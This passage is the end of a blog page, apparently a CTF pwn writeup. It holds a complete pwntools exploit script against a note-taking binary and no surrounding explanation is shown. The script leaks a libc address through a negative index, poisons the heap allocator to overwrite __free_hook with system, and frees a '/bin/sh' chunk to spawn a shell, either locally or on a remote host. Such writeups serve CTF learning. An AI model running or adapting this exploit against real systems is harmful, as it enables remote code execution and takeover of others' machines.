+<h1 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">def <span class="title function_">add_note</span><span class="params">(p,idx,size,data)</span>:</span><br><span class="line">    idx = idx.encode()</span><br><span class="line">    size = size.encode()</span><br><span class="line">    p.sendlineafter(b<span class="string">&#x27;&gt; &#x27;</span>,b<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(b<span class="string">&#x27;Index&#x27;</span>,idx)</span><br><span class="line">    p.sendlineafter(b<span class="string">&#x27;Size: &#x27;</span>,size)</span><br><span class="line">    p.sendlineafter(b<span class="string">&#x27;Data: &#x27;</span>,data)</span><br><span class="line"></span><br><span class="line">def edit_note(p,idx,data):</span><br><span class="line">    idx = idx.encode()</span><br><span class="line">    <span class="meta"># data = data.encode()</span></span><br><span class="line">    p.sendlineafter(b<span class="string">&#x27;&gt; &#x27;</span>,b<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(b<span class="string">&#x27;Index&#x27;</span>,idx)</span><br><span class="line">    p.sendafter(b<span class="string">&#x27;Data: &#x27;</span>,data)</span><br><span class="line"></span><br><span class="line">def remove_note(p,idx):</span><br><span class="line">    idx = idx.encode()</span><br><span class="line">    p.sendlineafter(b<span class="string">&#x27;&gt; &#x27;</span>,b<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(b<span class="string">&#x27;Index&#x27;</span>,idx)</span><br><span class="line"></span><br><span class="line">def read_note(p,idx):</span><br><span class="line">    idx = idx.encode()</span><br><span class="line">    p.sendlineafter(b<span class="string">&#x27;&gt; &#x27;</span>,b<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(b<span class="string">&#x27;Index&#x27;</span>,idx)</span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &lt;= <span class="number">2</span>:</span><br><span class="line">    p = process(<span class="string">&quot;./&quot;</span> + sys.argv[<span class="number">1</span>])</span><br><span class="line">    e = ELF(<span class="string">&quot;./&quot;</span> + sys.argv[<span class="number">1</span>], checksec=False)</span><br><span class="line"></span><br><span class="line">    gdb.attach(p,</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">b*add_note+<span class="number">166</span></span><br><span class="line">b*remove_note+<span class="number">115</span></span><br><span class="line">b*read_note</span><br><span class="line">b*edit_note</span><br><span class="line">c</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    remote_addr = sys.argv[<span class="number">1</span>]</span><br><span class="line">    remote_port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    p = remote(remote_addr, <span class="type">int</span>(remote_port))</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">########## LEAK LIBC ##########  </span><br><span class="line">read_note(p,<span class="string">&#x27;-1833&#x27;</span>)</span><br><span class="line">p.recvuntil(b<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">libc_leak = p.recv(<span class="number">6</span>) + b<span class="string">&#x27;\0&#x27;</span>*<span class="number">2</span></span><br><span class="line">libc_leak = u64(libc_leak)</span><br><span class="line"><span class="built_in">log</span>.info(<span class="string">&#x27;libc leak : &#x27;</span> + hex(libc_leak))</span><br><span class="line">offet_to_libc_base = <span class="number">0x59140</span></span><br><span class="line">libc_base = libc_leak - offet_to_libc_base</span><br><span class="line"><span class="built_in">log</span>.info(<span class="string">&#x27;libc base : &#x27;</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">######### OVERWRITE __FREE_HOOK ##########</span><br><span class="line">add_note(p,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;128&#x27;</span>,b<span class="string">&#x27;this is 0&#x27;</span>)</span><br><span class="line">add_note(p,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;128&#x27;</span>,b<span class="string">&#x27;this is 2&#x27;</span>)</span><br><span class="line">add_note(p,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;128&#x27;</span>,b<span class="string">&#x27;this is 3&#x27;</span>)</span><br><span class="line">remove_note(p,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">remove_note(p,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset_to_free_hook = <span class="number">0x1c5b28</span></span><br><span class="line">offset_to_system = <span class="number">0x49970</span></span><br><span class="line">free_hook = libc_base + offset_to_free_hook</span><br><span class="line">system = libc_base + offset_to_system</span><br><span class="line"></span><br><span class="line">payload = b<span class="string">&#x27;a&#x27;</span>*<span class="number">144</span> +  p64(free_hook)</span><br><span class="line">add_note(p,<span class="string">&#x27;-4&#x27;</span>,<span class="string">&#x27;256&#x27;</span>,b<span class="string">&#x27;poison&#x27;</span>)</span><br><span class="line">edit_note(p,<span class="string">&#x27;0&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">############# GET SHELL #############<span class="meta">#</span></span><br><span class="line"><span class="meta">payload = system</span></span><br><span class="line">add_note(p,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;128&#x27;</span>,b<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">add_note(p,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;128&#x27;</span>,p64(payload))</span><br><span class="line"></span><br><span class="line">remove_note(p,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar/lucy.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">vuk3r</div><div class="author-info-description">Learn what we hacked<br>hack what we can't</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/vuk3r"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content"><a href="/about/">>_$(whoami)</a></div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/08/16/How_different_between%20Pointer_and_Array_from_Assembly_Perspective/" title="[Dummy] - How different between Pointer and Array from Assembly Perspective ? "><img src="/img/post/dummy/different%20between%20Pointer%20and%20Array/thumbnail.png" onerror="this.onerror=null;this.src='/img/error/404.jpg'" alt="[Dummy] - How different between Pointer and Array from Assembly Perspective ? "/></a><div class="content"><a class="title" href="/2025/08/16/How_different_between%20Pointer_and_Array_from_Assembly_Perspective/" title="[Dummy] - How different between Pointer and Array from Assembly Perspective ? ">[Dummy] - How different between Pointer and Array from Assembly Perspective ? </a><time datetime="2025-08-16T17:14:35.000Z" title="Created 2025-08-17 00:14:35">2025-08-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/08/16/picoCTF_medium(1)/" title="[Writeup] - Solving Pwn on PicoCTF"><img src="/img/post/writeup/picoctf/thumbnail.png" onerror="this.onerror=null;this.src='/img/error/404.jpg'" alt="[Writeup] - Solving Pwn on PicoCTF"/></a><div class="content"><a class="title" href="/2025/08/16/picoCTF_medium(1)/" title="[Writeup] - Solving Pwn on PicoCTF">[Writeup] - Solving Pwn on PicoCTF</a><time datetime="2025-08-16T17:14:35.000Z" title="Created 2025-08-17 00:14:35">2025-08-17</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
+            <i class="fas fa-folder-open"></i>
+            <span>Categories</span>
+            
+          </div>
+          <ul class="card-category-list" id="aside-cat-list">
+            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/Dummy/"><span class="card-category-list-name">Dummy</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/Writeup/"><span class="card-category-list-name">Writeup</span><span class="card-category-list-count">1</span></a></li>
+          </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>Tags</span></div><div class="card-tag-cloud"><a href="/tags/PWN/" style="font-size: 1.1em; color: #999">PWN</a> <a href="/tags/Dummy/" style="font-size: 1.1em; color: #999">Dummy</a> <a href="/tags/Writeup/" style="font-size: 1.1em; color: #999">Writeup</a></div></div><div class="card-widget card-archives">
+    <div class="item-headline">
+      <i class="fas fa-archive"></i>
+      <span>Archives</span>
+      
+    </div>
+  
+    <ul class="card-archive-list">
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2025/08/">
+            <span class="card-archive-list-date">
+              August 2025
+            </span>
+            <span class="card-archive-list-count">2</span>
+          </a>
+        </li>
+      
+    </ul>
+  </div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>Website Info</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">Article Count :</div><div class="item-count">2</div></div><div class="webinfo-item"><div class="item-name">Unique Visitors :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">Page Views :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">Last Update :</div><div class="item-count" id="last-push-date" data-lastPushDate="2026-01-21T11:43:29.624Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer" style="background: black;"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By vuk3r</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.4-b1</a></span></div><div class="footer_custom_text">Hope you like my profile</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
